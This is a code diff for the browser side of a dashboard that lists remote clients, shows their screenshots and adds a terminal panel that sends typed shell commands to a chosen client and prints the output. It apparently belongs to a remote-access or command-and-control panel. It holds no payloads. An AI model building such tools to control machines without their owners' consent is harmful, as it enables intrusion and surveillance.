@@ -31,6 +31,7 @@ function populateTable(data) {
 							.catch((error) => console.error('Error fetching screenshot:', error))
 					})
 				)
+			else if (action == 'Run Command') return row.appendChild(createTd(action, true, () => showCLI(item.clientId)))
 			row.appendChild(createTd(action, true, () => true))
 		})
 
@@ -42,9 +43,70 @@ function populateTable(data) {
 }
 fetch('/clients')
 	.then((res) => res.json())
-	.then((res) => {
-		console.log(res)
-		populateTable(res)
+	.then((res) => populateTable(res))
+
+document.getElementById('close').addEventListener('click', () => document.getElementById('ss-container').classList.add('hidden'))
+document.getElementById('close-cli').addEventListener('click', () => document.getElementById('cli').classList.add('hidden'))
+
+
+function showCLI(clientId) {
+	const cliInput = document.getElementById('cli-input')
+	const outputDiv = document.getElementById('output')
+	const cliPrefix = document.getElementById('cli-prefix')
+
+	document.getElementById('cli').classList.remove('hidden')
+	cliPrefix.textContent = `${clientId}> `
+	
+	cliInput.addEventListener('keydown', async (event) => {
+		if (event.key === 'Enter') {
+			const command = cliInput.value.trim()
+			if (command == 'cls' || command == 'clear') {
+				outputDiv.innerHTML = ''
+				cliInput.value = ''
+				return
+			}
+			if (command !== '') {
+				displayCommand(command)
+				await sendCommand(command)
+				cliInput.value = ''
+			}
+		}
 	})
 
-document.getElementById('close').addEventListener('click', () => 	document.getElementById('ss-container').classList.add('hidden'))
+	function displayCommand(command) {
+		const commandLine = document.createElement('div')
+		commandLine.textContent = `${cliPrefix.textContent} ${command}`
+		outputDiv.appendChild(commandLine)
+		outputDiv.scrollTop = outputDiv.scrollHeight
+		scrollToBottom()
+	}
+
+	async function sendCommand(command) {
+		try {
+			const response = await fetch('/command', {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json'
+				},
+				body: JSON.stringify({command, clientId})
+			})
+			const data = await response.json()
+			if (data.stderr) displayOutput(data.stderr)
+			else displayOutput(data.stdout)
+		} catch (error) {
+			displayOutput('Error: Unable to send command')
+		}
+	}
+
+    function displayOutput(output) {
+        const formattedOutput = output.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\r\n/g, '<br>')
+        const outputLine = document.createElement('div');
+        outputLine.innerHTML = formattedOutput;
+        outputDiv.appendChild(outputLine);
+		scrollToBottom()
+    }
+	function scrollToBottom() {
+		const cli = document.getElementById('cli-container')
+		cli.scrollTop = cli.scrollHeight
+	}
+}
